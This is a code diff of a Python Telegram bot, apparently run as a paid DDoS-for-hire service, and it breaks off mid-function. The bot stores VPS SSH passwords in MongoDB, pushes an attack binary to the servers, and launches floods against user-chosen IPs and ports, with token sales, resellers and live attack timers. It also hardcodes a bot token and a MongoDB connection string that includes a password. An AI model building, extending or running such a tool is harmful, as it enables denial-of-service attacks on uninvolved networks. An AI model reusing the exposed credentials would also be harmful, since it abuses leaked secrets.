@@ -1,915 +1,765 @@
-import logging
-import datetime
 import asyncio
-import os
-import asyncssh
-import telegram
-from telegram.ext import filters
-from pymongo import MongoClient
+import time
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
-from bson import Binary
-# Track active attack status
-attack_running = False
-current_time = datetime.datetime.now(datetime.UTC)
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
+import pymongo
+from pymongo import MongoClient
+from bson.objectid import ObjectId
+import asyncssh
+from datetime import datetime
+from hashlib import md5
+import base64
+import logging
+from collections import deque
 
 # Configure logging
-logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Telegram API & MongoDB credentials
-TELEGRAM_BOT_TOKEN = "6982857776:AAFDG6KtTz4T6jYjeZiwFdqZgTpqSW8Mj3Y"
-MONGO_URI = "mongodb+srv://jonny:ranbal1@jonny.wwfqv.mongodb.net/?retryWrites=true&w=majority&appName=jonny"
-DB_NAME = "TEST"
+# Bot Configuration
+BOT_TOKEN = "6982857776:AAFDG6KtTz4T6jYjeZiwFdqZgTpqSW8Mj3Y"  # 🔑 Your bot token
+OWNER_ID = 5759284972  # 👑 Owner's Telegram ID
+RESELLER_IDS = [5851079012]  # 💼 List of reseller IDs
 
+# MongoDB Configuration
+MONGODB_URIS = [
+    "mongodb+srv://jonny:ranbal1@jonny.wwfqv.mongodb.net/?retryWrites=true&w=majority&appName=jonny",
+]
+DATABASE_NAME = "LUFFY2"  # 🗄️ Replace with your MongoDB database name
 
-# Database setup
-client = MongoClient(MONGO_URI)
-db = client[DB_NAME]
-vps_collection = db["vps_list"]
-aws_vps_collection = db["aws_vps_list"]
-approved_users_collection = db["approved_users"]
-settings_collection = db["settings"]
-admins_collection = db["admins"]
+# Attack Parameters
+PACKET_SIZE = 600  # 📦 Packet size for attacks
+THREAD = 10  # 🧵 Number of threads
+BINARY_NAME = "ranbal"  # ⚙️ Binary name
+BINARY_PATH = f"./{BINARY_NAME}"  # 📂 Path to binary on VPS
 
-# Initial owner ID
-OWNER_USER_ID = 5759284972
+# Global Variables for Dynamic VPS Allocation
+vps_pool = []  # List of all VPS
+vps_locks = {}  # Dictionary to track which VPS are in use (True = in use, False = available)
+default_vps_count = 2  # Default number of VPS for attacks (can be changed with /vps)
 
-# Ensure owner is in admins collection
-if not admins_collection.find_one({"user_id": OWNER_USER_ID}):
-    admins_collection.insert_one({"user_id": OWNER_USER_ID, "expiry": datetime.datetime.max})
+# Initialize the Bot with optimized settings
+app = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()
 
-SSH_SEMAPHORE = asyncio.Semaphore(100)
-PEM_FILE_DIR = "./pem_files/"
-os.makedirs(PEM_FILE_DIR, exist_ok=True)
-BINARY_FILE_DIR = "./binaries/"
-os.makedirs(BINARY_FILE_DIR, exist_ok=True)
-
-# Helper functions
-def is_owner(user_id):
-    return user_id == OWNER_USER_ID
-
-def is_admin(user_id):
-    admin = admins_collection.find_one({"user_id": user_id})
-    if admin and "expiry" in admin:
-        current_time = datetime.datetime.utcnow()
-        if admin["expiry"] > current_time:
-            return True
-        else:
-            admins_collection.delete_one({"user_id": user_id})
-    return False
-
-def is_approved(user_id):
-    user_approval = approved_users_collection.find_one({"user_id": user_id})
-    if user_approval and "expiry" in user_approval:
-        current_time = datetime.datetime.utcnow()
-        if user_approval["expiry"] >= current_time:
-            return True
-        else:
-            approved_users_collection.delete_one({"user_id": user_id})
-    return False
-
-def is_vps_on_cooldown(vps_ip, vps_type):
-    collection = vps_collection if vps_type == "regular" else aws_vps_collection
-    vps = collection.find_one({"ip": vps_ip})
-    if vps and "cooldown_until" in vps:
-        current_time = datetime.datetime.utcnow()
-        return vps["cooldown_until"] > current_time
-    return False
-
-def set_vps_cooldown(vps_ip, vps_type, duration):
-    collection = vps_collection if vps_type == "regular" else aws_vps_collection
-
-    cooldown_until = datetime.datetime.utcnow() + datetime.timedelta(seconds=0)
-    
-    if duration > 0:  # Ensure cooldown is only set if attack was successful
-        collection.update_one({"ip": vps_ip}, {"$set": {"cooldown_until": cooldown_until}}, upsert=True)
-        logger.info(f"Cooldown set for {vps_ip} ({vps_type}) until {cooldown_until}")
-    else:
-        logger.warning(f"Skipping cooldown for {vps_ip} ({vps_type}) because attack duration was 0")
-
-async def check_vps_alive(vps_data, vps_type):
-    async with SSH_SEMAPHORE:
+# MongoDB Client Helper (Cached Connection)
+_mongo_clients = {}
+def get_mongo_client(user_id=None):
+    """Connect to MongoDB with cached client for speed."""
+    key = user_id if user_id else "global"
+    if key not in _mongo_clients:
+        uri = MONGODB_URIS[0] if user_id is None else MONGODB_URIS[int(md5(str(user_id).encode()).hexdigest(), 16) % len(MONGODB_URIS)]
         try:
-            if vps_type == "aws" and "pem_file" in vps_data:
-                conn = await asyncio.wait_for(
-                    asyncssh.connect(
-                        vps_data["ip"],
-                        port=vps_data.get("ssh_port", 22),  # Use custom port if provided, else default to 22
-                        username=vps_data["username"],
-                        client_keys=[vps_data["pem_file"]],
-                        known_hosts=None
-                    ),
-                    timeout=5
-                )
-            else:
-                conn = await asyncio.wait_for(
-                    asyncssh.connect(
-                        vps_data["ip"],
-                        port=vps_data.get("ssh_port", 22),  # Use custom port if provided, else default to 22
-                        username=vps_data["username"],
-                        password=vps_data["password"],
-                        known_hosts=None
-                    ),
-                    timeout=5
-                )
-            await conn.close()
-            return True
-        except (asyncssh.Error, asyncio.TimeoutError):
-            return False
+            client = MongoClient(uri, serverSelectionTimeoutMS=5000)  # Faster timeout
+            client.server_info()  # Test connection
+            _mongo_clients[key] = client[DATABASE_NAME]
+        except pymongo.errors.ServerSelectionTimeoutError:
+            raise Exception("🚨 MongoDB connection failed!")
+    return _mongo_clients[key]
 
-# Start command
-# Start command
-async def start(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
+# Logging Actions (Async)
+async def log_action(user_id, action):
+    """Log user actions with timestamp asynchronously."""
+    db = get_mongo_client(user_id)
+    await asyncio.to_thread(db.logs.insert_one, {
+        "user_id": user_id,
+        "action": action,
+        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    })
 
-    # Check user role
-    if is_owner(user_id):
-        role = "👑 *OWNER*"
-    elif is_admin(user_id):
-        role = "🛠 *ADMIN*"
-    elif is_approved(user_id):
-        role = "✅ *APPROVED USER*"
+# VPS Management
+async def get_vps_list():
+    """Fetch list of all available VPS asynchronously."""
+    db = get_mongo_client(None)
+    return await asyncio.to_thread(list, db.vps.find())
+
+# Initialize VPS Pool and Load Default VPS Count
+async def initialize_vps_pool():
+    """Initialize the VPS pool and load the default VPS count from MongoDB."""
+    global vps_pool, vps_locks, default_vps_count
+    vps_pool = await get_vps_list()
+    vps_locks = {f"{vps['ip']}:{vps['port']}": False for vps in vps_pool}  # Initialize all VPS as available
+    logger.info(f"Initialized VPS pool with {len(vps_pool)} VPS")
+
+    # Load default_vps_count from MongoDB (if set)
+    db = get_mongo_client(None)
+    config = await asyncio.to_thread(db.config.find_one, {"key": "default_vps_count"})
+    if config:
+        default_vps_count = config["value"]
     else:
-        role = "🚫 *UNAUTHORIZED USER*"
+        # Set default value in MongoDB
+        await asyncio.to_thread(db.config.update_one, {"key": "default_vps_count"}, {"$set": {"value": default_vps_count}}, upsert=True)
+    logger.info(f"Loaded default VPS count: {default_vps_count}")
 
-    # Custom welcome message based on role
-    message = f"""
-🔥 *Welcome to Unlimited DDOS Bot!* 🔥
-
-👤 *Your Role:* {role}  
-📌 Use `/help_cmd` to see all available commands.
-
-⚠️ *Note:* Unauthorized users cannot run attacks.
-    """
-
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")
-
-async def help_command(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if is_owner(user_id):
-        message = (
-            "All Available Commands:\n\n"
-            "/start - Start the bot\n"
-            "/add_vps <ip> <ssh_port> <username> <password> - Add a VPS\n"
-            "/add_aws_vps <ip> <username> <pem_filename> - Add an AWS VPS\n"
-            "/attack <target_ip> <port> <duration> - Launch attack\n"
-            "/vps_status - Check VPS status\n"
-            "/upload_pem - Upload PEM file\n"
-            "/upload_binary - Upload attack binary\n"
-            "/setup - Deploy binary on all VPS\n"
-            "/add_user <telegram_id> <days_valid> - Approve a user\n"
-            "/remove_user <telegram_id> - Remove a user\n"
-            "/list_users - Show approved users\n"
-            "/remove_vps <vps_ip> - Remove a VPS\n"
-            "/PKT - Configure packet size\n"
-            "/THREAD - Configure thread count\n"
-            "/add_admin <telegram_id> <days_valid> - Add an admin (owner only)\n"
-            "/remove_admin <telegram_id> - Remove an admin (owner only)\n"
-            "/list_admins - Show admins (owner only)\n"
-            "/help_cmd - Show this help message"
-        )
-    elif is_admin(user_id):
-        message = (
-            "Admin Commands:\n\n"
-            "/start - Start the bot\n"
-            "/attack <target_ip> <port> <duration> - Launch attack\n"
-            "/help_cmd - Show this help message\n"
-            "/add_user <telegram_id> <days_valid> - Approve a user\n"
-            "/remove_user <telegram_id> - Remove a user\n"
-            "/list_users - Show approved users"
-        )
-    else:
-        message = (
-            "User Commands:\n\n"
-            "/start - Start the bot\n"
-            "/attack <target_ip> <port> <duration> - Launch attack (if approved)\n"
-            "/help_cmd - Show this help message"
-        )
-
-    await context.bot.send_message(chat_id, text=message)
-
-
-# Add admin command
-async def add_admin(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Sirf owner admins add kar sakta hai!*", parse_mode="Markdown")
-        return
-
-    args = context.args
-    if len(args) != 2:
-        await context.bot.send_message(chat_id, "⚠️ *Usage: /add_admin <telegram_id> <days_valid>*", parse_mode="Markdown")
-        return
-
+# Check if Binary Exists on VPS
+async def check_binary_on_vps(vps):
+    """Check if the binary exists on the VPS."""
     try:
-        new_admin_id = int(args[0])
-        days_valid = int(args[1])
-    except ValueError:
-        await context.bot.send_message(chat_id, "⚠️ *Galat Telegram ID ya days_valid!*", parse_mode="Markdown")
-        return
+        async with asyncssh.connect(vps['ip'], port=vps['port'], username=vps['username'], password=vps['password'], known_hosts=None) as conn:
+            result = await conn.run(f"test -f {BINARY_PATH} && echo 'exists' || echo 'not found'")
+            return result.stdout.strip() == "exists"
+    except Exception as e:
+        logger.error(f"🚨 Error checking binary on VPS {vps['ip']}:{vps['port']}: {e}")
+        return False
 
-    expiry_date = datetime.datetime.utcnow() + datetime.timedelta(days=days_valid)
-    admins_collection.update_one(
-        {"user_id": new_admin_id},
-        {"$set": {"user_id": new_admin_id, "expiry": expiry_date}},
-        upsert=True
+# Attack Execution
+async def execute_attack_on_vps(task_id, user_id, ip, port, duration, vps):
+    """Execute attack on a single VPS."""
+    try:
+        async with asyncssh.connect(vps['ip'], port=vps['port'], username=vps['username'], password=vps['password'], known_hosts=None) as conn:
+            duration_seconds = int(duration)  # Duration is always in seconds
+            command = f"{BINARY_PATH} {ip} {port} {duration_seconds} {PACKET_SIZE} {THREAD}"
+            result = await conn.run(command)
+            db = get_mongo_client(user_id)
+            vps_key = f"{vps['ip']}:{vps['port']}"
+            status = "completed" if result.exit_status == 0 else "failed"
+            await asyncio.to_thread(db.tasks.update_one, {"_id": ObjectId(task_id)}, {"$set": {f"vps_status.{vps_key}": status}})
+            if result.exit_status != 0:
+                raise Exception(f"🔥 Command failed: {result.exit_status}")
+    except Exception as e:
+        logger.error(f"🚨 Error on VPS {vps['ip']}:{vps['port']}: {e}")
+        db = get_mongo_client(user_id)
+        vps_key = f"{vps['ip']}:{vps['port']}"
+        await asyncio.to_thread(db.tasks.update_one, {"_id": ObjectId(task_id)}, {"$set": {f"vps_status.{vps_key}": "failed"}})
+
+async def update_attack_timer(update, context, message_id, chat_id, duration_seconds, task_id, vps_list, ip, port, num_vps):
+    """Update attack status with a live timer."""
+    try:
+        start_time = time.time()
+        while time.time() - start_time < duration_seconds:
+            remaining = max(0, duration_seconds - int(time.time() - start_time))
+            timer_text = (
+                f"🚀 **Attack in Progress**\n"
+                f"🎯 Target: `{ip}:{port}`\n"
+                f"📦 Allocated VPS: {num_vps}\n"
+                f"⏳ Time Left: `{remaining // 60}m {remaining % 60}s`\n"
+                f"💻 Bot by @MrRanDom8"
+            )
+            try:
+                await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=timer_text)
+            except:
+                pass
+            await asyncio.sleep(1)
+
+        db = get_mongo_client(chat_id)
+        task = await asyncio.to_thread(db.tasks.find_one, {"_id": ObjectId(task_id)})
+        vps_status = task.get("vps_status", {})
+        all_completed = all(status == "completed" for status in vps_status.values())
+        vps_status_text = "\n".join([f"🌐 {vps}: {status}" for vps, status in vps_status.items()])
+        final_text = (
+            f"🎉 **Attack Completed Successfully!**\n"
+            f"🎯 Target: `{ip}:{port}`\n"
+            f"📦 Allocated VPS: {num_vps}\n"
+            f"📜 VPS Status:\n{vps_status_text}\n"
+            f"💻 Bot by @MrRanDom8"
+        ) if all_completed else (
+            f"🚫 **Attack Completed Successfully**\n"
+            f"🎯 Target: `{ip}:{port}`\n"
+            f"📦 Allocated VPS: {num_vps}\n"
+            f"📜 VPS Status:\n{vps_status_text}\n"
+            f"💻 Bot by @MrRanDom8"
+        )
+        reply_markup = InlineKeyboardMarkup([
+            [InlineKeyboardButton("✅ Worked", callback_data=f"feedback_{task_id}_success")],
+            [InlineKeyboardButton("❌ Failed", callback_data=f"feedback_{task_id}_fail")]
+        ]) if all_completed else None
+        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=final_text, reply_markup=reply_markup)
+    except Exception as e:
+        logger.error(f"🚨 Error in update_attack_timer: {e}")
+        final_text = (
+            f"🚫 **Attack Interrupted**\n"
+            f"🎯 Target: `{ip}:{port}`\n"
+            f"📦 Allocated VPS: {num_vps}\n"
+            f"💻 Bot by @MrRanDom8"
+        )
+        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=final_text)
+    finally:
+        for vps in vps_list:
+            vps_locks[f"{vps['ip']}:{vps['port']}"] = False  # Release the VPS
+        logger.info(f"🔓 Released {len(vps_list)} VPS for user {chat_id}")
+
+async def execute_batch_attack(task_id, user_id, ip, port, duration, vps_list, update, context, message_id, chat_id, allocated_vps):
+    """Coordinate attack across all allocated VPS."""
+    try:
+        duration_seconds = int(duration)  # Duration is always in seconds
+        timer_task = asyncio.create_task(update_attack_timer(update, context, message_id, chat_id, duration_seconds, task_id, vps_list, ip, port, len(allocated_vps)))
+        attack_task = asyncio.gather(*[execute_attack_on_vps(task_id, user_id, ip, port, duration, vps) for vps in vps_list])
+        await asyncio.gather(timer_task, attack_task)
+    except Exception as e:
+        logger.error(f"🚨 Error in execute_batch_attack: {e}")
+        final_text = (
+            f"🚫 **Attack Failed Due to Error**\n"
+            f"🎯 Target: `{ip}:{port}`\n"
+            f"📦 Allocated VPS: {len(allocated_vps)}\n"
+            f"💻 Bot by @MrRanDom8"
+        )
+        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=final_text)
+        for vps in allocated_vps:
+            vps_locks[f"{vps['ip']}:{vps['port']}"] = False  # Release the VPS on failure
+        logger.info(f"🔓 Released {len(allocated_vps)} VPS due to error for user {chat_id}")
+
+# Command Handlers
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Welcome users with a stylish message."""
+    user_id = update.message.from_user.id
+    username = update.message.from_user.username or "Unknown"
+    db = get_mongo_client(user_id)
+    await asyncio.to_thread(db.users.update_one, {"user_id": user_id}, {"$set": {"username": username}}, upsert=True)
+
+    welcome_text = (
+        f"🌟 **Welcome to the Elite Bot!**\n"
+        f"👤 User: @{username}\n"
+        f"💻 Powered by @MrRanDom8\n\n"
+        f"✨ Use /help to explore commands!"
+    ) if user_id not in [OWNER_ID] + RESELLER_IDS else (
+        f"👑 **Welcome Back, {'Owner' if user_id == OWNER_ID else 'Reseller'}!**\n"
+        f"👤 User: @{username}\n"
+        f"💻 Powered by @MrRanDom8\n\n"
+        f"✨ Use /help for your elite commands!"
     )
-    await context.bot.send_message(chat_id, f"✅ *Admin {new_admin_id} approved for {days_valid} days!*", parse_mode="Markdown")
+    asyncio.create_task(log_action(user_id, "started the bot"))
+    await update.message.reply_text(welcome_text)
 
-# Remove admin command
-async def remove_admin(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
+async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Display a beautifully formatted help menu."""
+    user_id = update.message.from_user.id
+    db = get_mongo_client(user_id)
+    user = await asyncio.to_thread(db.users.find_one, {"user_id": user_id})
+    role = user.get("role", "member") if user else "member"
 
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Sirf owner admins remove kar sakta hai!*", parse_mode="Markdown")
+    if user_id == OWNER_ID or role == "admin":
+        help_text = (
+            "👑 **Admin/Owner Commands** 👑\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🔫 /attack [IP] [PORT] [SECONDS] - Launch an attack\n"
+            "💰 /addtokens [ID] [AMOUNT] - Add tokens\n"
+            "🚫 /ban [ID] - Ban a user\n"
+            "✅ /unban [ID] - Unban a user\n"
+            "💼 /addreseller [ID] - Add reseller\n"
+            "❌ /removereseller [ID] - Remove reseller\n"
+            "👑 /setadmin [ID] - Set admin\n"
+            "👤 /removeadmin [ID] - Remove admin\n"
+            "📋 /listusers - List all users\n"
+            "🌐 /add_vps [IP] [PORT] [USER] [PASS] - Add VPS\n"
+            "🗑️ /rem_vps [IP] [PORT] - Remove VPS\n"
+            "📜 /list_vps - List VPS details\n"
+            "⚙️ /setup - Install binary on VPS\n"
+            "📤 /upload_binary - Upload binary\n"
+            "🔍 /check_lock - Check attack lock status\n"
+            "🔓 /release_lock - Manually release attack lock\n"
+            "📦 /vps [NUMBER_OF_VPS] - Set default number of VPS for attacks\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "💻 Bot by @MrRanDom8"
+        )
+    elif user_id in RESELLER_IDS or role == "reseller":
+        help_text = (
+            "💼 **Reseller Commands** 💼\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🔫 /attack [IP] [PORT] [SECONDS] - Launch an attack\n"
+            "💰 /addtokens [ID] [AMOUNT] - Add tokens\n"
+            "📋 /listusers - List all users\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "💻 Bot by @MrRanDom8"
+        )
+    else:
+        help_text = (
+            "👤 **User Commands** 👤\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🔫 /attack [IP] [PORT] [SECONDS] - Launch an attack\n"
+            "💰 /checktokens - Check token balance\n"
+            "🛒 /buytokens [AMOUNT] - Buy tokens\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "💻 Bot by @MrRanDom8"
+        )
+    await update.message.reply_text(help_text)
+
+async def add_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Add tokens to a user's account."""
+    user_id = update.message.from_user.id
+    args = context.args
+    if len(args) < 2:
+        await update.message.reply_text("❌ **Usage:** /addtokens [ID] [AMOUNT]")
+        return
+    if user_id not in [OWNER_ID] + RESELLER_IDS:
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner/Resellers can add tokens!")
         return
 
+    target_id, amount = int(args[0]), int(args[1])
+    db = get_mongo_client(target_id)
+    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$inc": {"tokens": amount}}, upsert=True)
+    await update.message.reply_text(f"💰 **Success:** Added `{amount}` tokens to `{target_id}`!\n💻 Bot by @MrRanDom8")
+
+async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Ban a user from the bot."""
+    user_id = update.message.from_user.id
     args = context.args
-    if len(args) != 1:
-        await context.bot.send_message(chat_id, "⚠️ *Usage: /remove_admin <telegram_id>*", parse_mode="Markdown")
+    if len(args) < 1:
+        await update.message.reply_text("❌ **Usage:** /ban [ID]")
+        return
+    if user_id != OWNER_ID:
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner can ban!")
+        return
+
+    target_id = int(args[0])
+    db = get_mongo_client(target_id)
+    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$set": {"banned": 1}}, upsert=True)
+    await update.message.reply_text(f"🚫 **Banned:** User `{target_id}` is now blocked!\n💻 Bot by @MrRanDom8")
+
+async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Unban a user."""
+    user_id = update.message.from_user.id
+    args = context.args
+    if len(args) < 1:
+        await update.message.reply_text("❌ **Usage:** /unban [ID]")
+        return
+    if user_id != OWNER_ID:
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner can unban!")
+        return
+
+    target_id = int(args[0])
+    db = get_mongo_client(target_id)
+    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$set": {"banned": 0}})
+    await update.message.reply_text(f"✅ **Unbanned:** User `{target_id}` is back!\n💻 Bot by @MrRanDom8")
+
+async def add_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Grant reseller privileges."""
+    user_id = update.message.from_user.id
+    args = context.args
+    if len(args) < 1:
+        await update.message.reply_text("❌ **Usage:** /addreseller [ID]")
+        return
+    if user_id != OWNER_ID:
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner can add resellers!")
+        return
+
+    target_id = int(args[0])
+    db = get_mongo_client(target_id)
+    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$set": {"role": "reseller"}}, upsert=True)
+    await update.message.reply_text(f"💼 **Promoted:** User `{target_id}` is now a reseller!\n💻 Bot by @MrRanDom8")
+
+async def remove_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Revoke reseller privileges."""
+    user_id = update.message.from_user.id
+    args = context.args
+    if len(args) < 1:
+        await update.message.reply_text("❌ **Usage:** /removereseller [ID]")
+        return
+    if user_id != OWNER_ID:
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner can remove resellers!")
+        return
+
+    target_id = int(args[0])
+    db = get_mongo_client(target_id)
+    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$set": {"role": "member"}})
+    await update.message.reply_text(f"👤 **Demoted:** User `{target_id}` is no longer a reseller!\n💻 Bot by @MrRanDom8")
+
+async def set_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Grant admin privileges."""
+    user_id = update.message.from_user.id
+    args = context.args
+    if len(args) < 1:
+        await update.message.reply_text("❌ **Usage:** /setadmin [ID]")
+        return
+    if user_id != OWNER_ID:
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner can set admins!")
+        return
+
+    target_id = int(args[0])
+    db = get_mongo_client(target_id)
+    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$set": {"role": "admin"}}, upsert=True)
+    await update.message.reply_text(f"👑 **Promoted:** User `{target_id}` is now an admin!\n💻 Bot by @MrRanDom8")
+
+async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Revoke admin privileges."""
+    user_id = update.message.from_user.id
+    args = context.args
+    if len(args) < 1:
+        await update.message.reply_text("❌ **Usage:** /removeadmin [ID]")
+        return
+    if user_id != OWNER_ID:
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner can remove admins!")
+        return
+
+    target_id = int(args[0])
+    db = get_mongo_client(target_id)
+    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$set": {"role": "member"}})
+    await update.message.reply_text(f"👤 **Demoted:** User `{target_id}` is no longer an admin!\n💻 Bot by @MrRanDom8")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """List all registered users."""
+    user_id = update.message.from_user.id
+    if user_id not in [OWNER_ID] + RESELLER_IDS:
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner/Resellers can list users!")
+        return
+
+    user_list = []
+    for uri in MONGODB_URIS:
+        client = MongoClient(uri)
+        db = client[DATABASE_NAME]
+        user_list.extend(await asyncio.to_thread(list, db.users.find()))
+    
+    if not user_list:
+        await update.message.reply_text("🛑 **No Users Found!**\n💻 Bot by @MrRanDom8")
+        return
+
+    user_text = "\n".join([f"🆔 `{u['user_id']}` | 📛 @{u.get('username', 'Unknown')} | 🎭 {u.get('role', 'member')} | 🚦 {'🔴 Banned' if u.get('banned', 0) else '🟢 Active'}" for u in user_list])
+    await update.message.reply_text(f"👥 **User List**\n━━━━━━━━━━━━━━━━━━━━━━\n{user_text}\n━━━━━━━━━━━━━━━━━━━━━━\n💻 Bot by @MrRanDom8")
+
+async def add_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Add a new VPS to the pool, identified by IP and PORT."""
+    user_id = update.message.from_user.id
+    args = context.args
+    if len(args) < 4:
+        await update.message.reply_text("❌ **Usage:** /add_vps [IP] [PORT] [USER] [PASS]")
+        return
+    if user_id != OWNER_ID:
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner can add VPS!")
+        return
+
+    vps_ip, port, username, password = args[0], int(args[1]), args[2], args[3]
+    db = get_mongo_client(None)
+    if await asyncio.to_thread(db.vps.find_one, {"ip": vps_ip, "port": port}):
+        await update.message.reply_text(f"❌ **Error:** VPS `{vps_ip}:{port}` already exists!\n💻 Bot by @MrRanDom8")
+        return
+
+    await asyncio.to_thread(db.vps.insert_one, {"ip": vps_ip, "port": port, "username": username, "password": password})
+    await initialize_vps_pool()  # Reinitialize the VPS pool after adding a VPS
+    await update.message.reply_text(f"🌐 **VPS Added:** `{vps_ip}:{port}`\nRun /setup to install binary!\n💻 Bot by @MrRanDom8")
+
+async def rem_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Remove a VPS from the pool, identified by IP and PORT."""
+    user_id = update.message.from_user.id
+    args = context.args
+    if len(args) < 2:
+        await update.message.reply_text("❌ **Usage:** /rem_vps [IP] [PORT]")
+        return
+    if user_id != OWNER_ID:
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner can remove VPS!")
+        return
+
+    vps_ip, port = args[0], int(args[1])
+    db = get_mongo_client(None)
+    result = await asyncio.to_thread(db.vps.delete_one, {"ip": vps_ip, "port": port})
+    await initialize_vps_pool()  # Reinitialize the VPS pool after removing a VPS
+    await update.message.reply_text(
+        f"🗑️ **VPS Removed:** `{vps_ip}:{port}`\n💻 Bot by @MrRanDom8" if result.deleted_count > 0 else
+        f"❌ **Not Found:** VPS `{vps_ip}:{port}` doesn’t exist!\n💻 Bot by @MrRanDom8"
+    )
+
+async def list_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """List VPS details for Owner/Admin only."""
+    user_id = update.message.from_user.id
+    db = get_mongo_client(user_id)
+    user = await asyncio.to_thread(db.users.find_one, {"user_id": user_id})
+    role = user.get("role", "member") if user else "member"
+
+    if user_id != OWNER_ID and role != "admin":
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner and Admins can view VPS details!\n💻 Bot by @MrRanDom8")
+        return
+
+    vps_list = await get_vps_list()
+    if not vps_list:
+        await update.message.reply_text("🛑 **No VPS Found!**\n💻 Bot by @MrRanDom8")
+        return
+
+    vps_text = "\n".join([f"🌐 `{v['ip']}:{v['port']}` | 👤 {v['username']}" for v in vps_list])
+    await update.message.reply_text(f"📜 **VPS List**\n━━━━━━━━━━━━━━━━━━━━━━\n{vps_text}\n━━━━━━━━━━━━━━━━━━━━━━\n💻 Bot by @MrRanDom8")
+
+async def upload_binary(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Upload a binary file to MongoDB."""
+    user_id = update.message.from_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner can upload binaries!")
+        return
+    if not update.message.reply_to_message or not update.message.reply_to_message.document:
+        await update.message.reply_text("❌ **Usage:** Reply to a binary file with /upload_binary!")
+        return
+
+    file = await update.message.reply_to_message.document.get_file()
+    file_path = await file.download_to_drive()
+    with open(file_path, "rb") as f:
+        binary_data = base64.b64encode(f.read()).decode('utf-8')
+
+    db = get_mongo_client(None)
+    await asyncio.to_thread(db.binaries.delete_many, {})
+    await asyncio.to_thread(db.binaries.insert_one, {"name": BINARY_NAME, "data": binary_data})
+    await update.message.reply_text(f"📤 **Binary Uploaded:** `{BINARY_NAME}` to MongoDB!\n💻 Bot by @MrRanDom8")
+
+async def setup(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Install binary on all VPS."""
+    user_id = update.message.from_user.id
+    if user_id != OWNER_ID:
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner can setup VPS!")
+        return
+
+    db = get_mongo_client(None)
+    binary_doc = await asyncio.to_thread(db.binaries.find_one, {"name": BINARY_NAME})
+    if not binary_doc:
+        await update.message.reply_text("❌ **Error:** No binary found! Upload with /upload_binary first!\n💻 Bot by @MrRanDom8")
+        return
+
+    binary_data = base64.b64decode(binary_doc["data"])
+    binary_base64 = base64.b64encode(binary_data).decode('utf-8')  # Encode binary as base64 string for transfer
+    vps_list = await get_vps_list()
+    if not vps_list:
+        await update.message.reply_text("❌ **Error:** No VPS available! Add some with /add_vps!\n💻 Bot by @MrRanDom8")
+        return
+
+    failed_vps = []
+    async def setup_vps(vps):
+        try:
+            async with asyncssh.connect(vps['ip'], port=vps['port'], username=vps['username'], password=vps['password'], known_hosts=None) as conn:
+                # Check disk space and permissions
+                disk_check = await conn.run("df -h .")
+                if disk_check.exit_status != 0:
+                    raise Exception(f"Failed to check disk space: {disk_check.stderr}")
